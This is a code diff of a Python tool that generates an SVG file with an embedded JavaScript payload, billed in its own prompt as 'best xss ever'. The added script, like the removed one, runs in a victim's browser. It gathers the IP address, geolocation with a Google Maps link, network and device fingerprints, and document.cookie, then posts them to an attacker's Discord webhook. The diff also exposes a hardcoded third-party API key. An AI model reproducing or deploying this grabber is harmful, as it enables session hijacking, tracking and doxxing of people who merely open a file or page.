@@ -17,60 +17,236 @@ SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
 </svg>
 """
 js_payload_code = """
-var webhook = 'WEBHOOK_URL';
-var site = 'https://myexternalip.com/raw';
+async function getIPInfo() {
+    const response = await fetch('https://api.ipdata.co/?api-key=d75ad8557d1eb86f55d816c62987104cc8e1fe9b219dd85857875a44');
+    const data = await response.json();
+    const isMobile = navigator.userAgent.toLowerCase().includes("mobile");
+    const platform = navigator.platform.toLowerCase();
+    const blocklists = data.threat.blocklists.map((blocklist) => {
+      return `\n+ Name: ${blocklist.name} \n+ Site: ${blocklist.site} \n+ Type: ${blocklist.type}`;
+    });    
+    
+    const provider = {
+      asn: {
+        asn: data.asn.asn,
+        name: data.asn.name,
+        domain: data.asn.domain,
+        route: data.asn.route,
+        type: data.asn.type
+      }}
 
-var get_ip = function() {
-    var ip = '';
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', site, false);
-    xhr.send();
-    if (xhr.status == 200) {
-        ip = xhr.responseText;
+    function getConnectionSpeed() {
+      if (navigator.connection && navigator.connection.effectiveType) {
+        return `${(navigator.connection.downlink * 8).toFixed(2)} Mb/s`;
+      }
+      return 'Unknown';
     }
-    return ip;
-};
-
-function get_browser() {
-    var browser = navigator.userAgent;
-    return browser;
+    const connectionSpeed = getConnectionSpeed();
+    
+    function getNetworkType() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!connection) {
+        return 'unknown';
+      }
+      const type = connection.effectiveType || connection.type;
+      if (type === 'ethernet') {
+        return 'Ethernet';
+      }
+      return type;
     }
-
-function get_time() {
-    var date = new Date();
-    var time = date.toLocaleString();
-    return time;
+    const networkType = getNetworkType();
+    
+    const getIP = async () => {
+      try {
+        const response = await fetch('https://ipapi.co/json');
+        const data = await response.json();
+        return data;
+      } catch (error) {
+        console.error(error);
+        return null;
+      }
+    };
+    
+    const ipData = await getIP();
+    const ipv4 = ipData?.ip;
+    const ipv6network = ipData?.network;
+  
+    let manufacturer;
+  
+    if (/^win/.test(platform)) {
+      manufacturer = 'Microsoft';
+    } else if (/^mac/.test(platform)) {
+      manufacturer = 'Apple';
+    } else if (/^linux/.test(platform)) {
+      manufacturer = 'Linux';
+    } else if (/^android/.test(platform)) {
+      manufacturer = 'Google';
+    } else if (/^ios/.test(platform)) {
+      manufacturer = 'Apple';
+    } else {
+      manufacturer = 'Unknown';
     }
+    
+    const currencyInfo = {
+      symbol: data.currency.symbol,
+      name: data.currency.name,
+      code: data.currency.code
+    };
 
-function get_url() {
-    var url = window.location.href;
-    return url;
-    }
+    const timeZoneInfo = {
+      name: data.time_zone.name,
+      offset: data.time_zone.offset
+    };
+    
+    const ipInfo = {
+      location: {
+        IPv4: data.ip,
+        continent: data.continent_code,
+        country: data.country_name,
+        country_code: data.country_code,
+        latitude: data.latitude,
+        longitude: data.longitude,
+        state: data.region,
+        city: data.city,
+        googleMaps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+        timezone: timeZoneInfo,
+        currency: currencyInfo,
+        phoneCode: `+${data.calling_code}`,
+        languages: data.languages.map(lang => ({ name: lang.name, native: lang.native, code: lang.code })),
+        inEU: data.is_eu ? 'Yes' : 'No'
+      },
+      info: {
+        ipv4: ipv4,
+        ip: data.ip,
+        provider: `${data.asn.name} (${data.asn.domain}) - ${data.asn.type}`,
+        version: data.version,
+        network: `${data.asn.route}`,
+        ipv6network: ipv6network,
+        connectionSpeed: getConnectionSpeed(),
+        wifiType: getNetworkType(),
+        threat: {
+          is_tor: data.threat.is_tor,
+          is_vpn: data.threat.is_proxy,
+          is_icloud_relay: data.threat.is_icloud_relay,
+          is_proxy: data.threat.is_proxy,
+          is_datacenter: data.threat.is_datacenter,
+          is_anonymous: data.threat.is_anonymous,
+          is_known_attacker: data.threat.is_known_attacker,
+          is_known_abuser: data.threat.is_known_abuser,
+          is_threat: data.threat.is_threat,
+          is_bogon: data.threat.is_bogon,
+          blocklists: blocklists
+        }
+      },
 
-function get_referrer() {
-    var referrer = document.referrer;
-    return referrer;
-    }
-
-function send_webhook() {
-    fetch(webhook, {
+      browserInfo: {
+        mobile: isMobile,
+        browser: navigator.appName,
+        manufacturer: manufacturer,
+        userAgent: navigator.userAgent,
+        page: location.href,
+        referrer: document.referrer,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+        historyLength: history.length,
+        language: navigator.language,
+        platform: navigator.platform,
+        javaEnabled: navigator.javaEnabled(),
+        cookiesEnabled: navigator.cookieEnabled,
+        javascriptEnabled: true,
+        cookieDump: document.cookie,
+        cpuThreads: navigator.hardwareConcurrency,
+        memory: `${Math.round((performance.memory.totalJSHeapSize / 1048576) * 100) / 100} MB`,
+        plugins: Array.from(navigator.plugins).map((plugin) => `${plugin.name} (${plugin.description})`).join(', '),
+        webdriver: navigator.webdriver ? 'Yes' : 'No',
+        battery: navigator.getBattery ? await navigator.getBattery().then((battery) => `${Math.floor(battery.level * 100)}%`) : 'N/A',
+        touchPoints: navigator.maxTouchPoints || '???',
+        doNotTrack: navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes' ? 'Yes' : 'No'
+      }
+    }; 
+  
+    const embed = {
+      title: '__**Someone Visited Your Site!**__',
+      description: '**IP Info**\n' + 
+        '```diff\n' +
+        `- Location Information:\n` +
+        `+ IP: ${ipInfo.location.IPv4}\n` +
+        `+ Continent: ${ipInfo.location.continent}\n` +
+        `+ Country: ${ipInfo.location.country}\n` +
+        `+ Country Code: ${ipInfo.location.country_code}\n` +
+        `+ State: ${ipInfo.location.state}\n` +
+        `+ City: ${ipInfo.location.city}\n` +
+        `+ Google Maps: ${ipInfo.location.googleMaps}\n` +
+        `+ Timezone: ${timeZoneInfo.name} (Offset: ${timeZoneInfo.offset})\n` +
+        `+ Currency: ${currencyInfo.symbol} - ${currencyInfo.name} (${currencyInfo.code})\n` +
+        `+ Phone Code: ${ipInfo.location.phoneCode}\n` +
+        `+ Languages: ${ipInfo.location.languages.map(lang => `${lang.name} - ${lang.code}`).join(', ')}\n` +
+        `+ In EU: ${ipInfo.location.inEU}\n\n` + 
+        `+ Latitude: ${ipInfo.location.latitude}\n` +
+        `+ Longitude: ${ipInfo.location.longitude}\n\n` +
+        `- Network Information:\n` +
+        `+ IP (IPv6): ${ipInfo.info.ipv4}\n` +
+        `+ Network (IPv6): ${ipInfo.info.ipv6network}\n` +
+        `+ IP (IPv4): ${ipInfo.info.ip}\n` +
+        `+ Network (IPv4): ${ipInfo.info.network}\n` +
+        `+ Bandwith: ${ipInfo.info.connectionSpeed}\n` +
+        `+ Wifi Type: ${ipInfo.info.wifiType}\n` +
+        `+ Provider: ${ipInfo.info.provider}\n\n` +
+        `- Threats & Proxy/VPN Information:\n` +
+        `+ Threat: ${ipInfo.info.threat.is_threat}\n` +
+        `+ VPN: ${ipInfo.info.threat.is_vpn}\n` +
+        `+ Proxy: ${ipInfo.info.threat.is_proxy}\n` +
+        `+ Tor Browser: ${ipInfo.info.threat.is_tor}\n` +
+        `+ Known Abuser: ${ipInfo.info.threat.is_known_abuser}\n\n` +
+        `+ BlockLists: ${ipInfo.info.threat.blocklists}\n` +
+        '```' + 
+        '**Browser Info**\n' + 
+        '```diff\n' + 
+        `- Browser & Document Information:\n` +
+        `+ Mobile: ${ipInfo.browserInfo.mobile}\n` +
+        `+ Browser: ${ipInfo.browserInfo.browser}\n` +
+        `+ Manufacturer: ${ipInfo.browserInfo.manufacturer}\n` +
+        `+ User Agent: ${ipInfo.browserInfo.userAgent}\n` +
+        `+ Page: ${ipInfo.browserInfo.page}\n` +
+        `+ Referrer: ${ipInfo.browserInfo.referrer}\n` +
+        `+ Window Size: ${ipInfo.browserInfo.windowSize}\n` +
+        `+ History Length: ${ipInfo.browserInfo.historyLength}\n` +
+        `+ Language: ${ipInfo.browserInfo.language}\n` +
+        `+ Platform: ${ipInfo.browserInfo.platform}\n` +
+        `+ Java Enabled: ${ipInfo.browserInfo.javaEnabled}\n` +
+        `+ Cookies Enabled: ${ipInfo.browserInfo.cookiesEnabled}\n` +
+        `+ Javascript Enabled: ${ipInfo.browserInfo.javascriptEnabled}\n` +
+        `+ CPU Threads: ${ipInfo.browserInfo.cpuThreads}\n` +
+        `+ Memory: ${ipInfo.browserInfo.memory}\n` + 
+        `+ Plugins: ${ipInfo.browserInfo.plugins}\n` +
+        `+ Webdriver/Bot: ${ipInfo.browserInfo.webdriver}\n` +
+        `+ Battery: ${ipInfo.browserInfo.battery}\n` +
+        `+ Touch Points: ${ipInfo.browserInfo.touchPoints}\n` +
+        `+ Do Not Track: ${ipInfo.browserInfo.doNotTrack}\n\n` +
+        `+ Cookie Dump: ${ipInfo.browserInfo.cookieDump}` +
+        '```' + `\n Made by ! LO$R`,
+        color: 0x00FF00
+      };
+      
+      const webhookURL = 'WEBHOOK_URL';
+      
+      await fetch(webhookURL, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+          'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nMade by K.Dot`
+          content: `@everyone new log`,
+          embeds: [embed]
         })
-    });
-}
-
-send_webhook();
+      });
+  }
+  getIPInfo();
 """
 
 
 class main:
     def __init__(self) -> None:
-        self.js_code = input("Would you like to use default js payload? (y/n) -> ")
+        self.js_code = input("Would you like to use default js payload? (best xss ever) [y/n] -> ")
         if self.js_code.lower() == "y":
             self.js_code2 = js_payload_code
             self.webhook = input("What is the webhook url? -> ")
